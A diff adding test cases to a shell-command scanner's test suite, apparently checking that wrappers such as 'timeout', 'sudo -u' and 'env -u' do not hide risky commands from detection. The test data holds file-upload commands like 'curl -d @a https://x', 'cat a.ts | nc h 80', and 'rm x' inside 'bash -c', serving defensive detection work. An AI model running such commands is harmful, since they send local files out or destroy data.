@@ -229,6 +229,9 @@ describe('scanShell', () => {
       ['npm publish', 'npm publish'],
       ['sudo scp a h:/b', 'scp'],
       ['timeout 10 curl -d @a https://x', 'curl -d'],
+      ['timeout -s KILL 5 curl -d @a https://x', 'curl -d'],
+      ['sudo -u bob curl -d @a https://x', 'curl -d'],
+      ['env -u TERM curl -d @a https://x', 'curl -d'],
       ['xargs curl -d @- https://x', 'curl -d'],
       ['ls && curl -d @a https://x', 'curl -d'],
       ['cat a.ts | nc h 80', 'nc'],
@@ -386,6 +389,7 @@ describe('scanShell', () => {
       'sleep 45; gh pr checks 123',
       'timeout 8 cat notes.txt',
       'timeout -s KILL 5s grep -r TODO src',
+      'timeout -vs KILL 5s grep -r TODO src',
       "sed -n '1,45p' notes.txt",
       'sed -e 10q notes.txt',
       "sed -n '$p' a.txt b.txt",
@@ -605,6 +609,8 @@ describe('scanShell', () => {
       expect(await opaque('python3 -c "print(1)"')).toEqual(['python3 -c']);
       expect(await opaque('eval "$CMD"')).toEqual(['eval']);
       expect(await opaque('sudo sh -c "rm x"')).toEqual(['sudo sh -c']);
+      expect(await opaque('sudo -u bob bash -c "rm x"')).toEqual(['sudo -u bob bash -c']);
+      expect(await opaque("timeout -s KILL 5 bash -c 'rm x'")).toEqual(['timeout -s KILL 5 bash -c']);
       expect(await opaque('echo x | sh')).toEqual([null, 'sh']);
       expect(await opaque('node script.js && python3 -m pytest && git status')).toEqual([null, null, null]);
     });
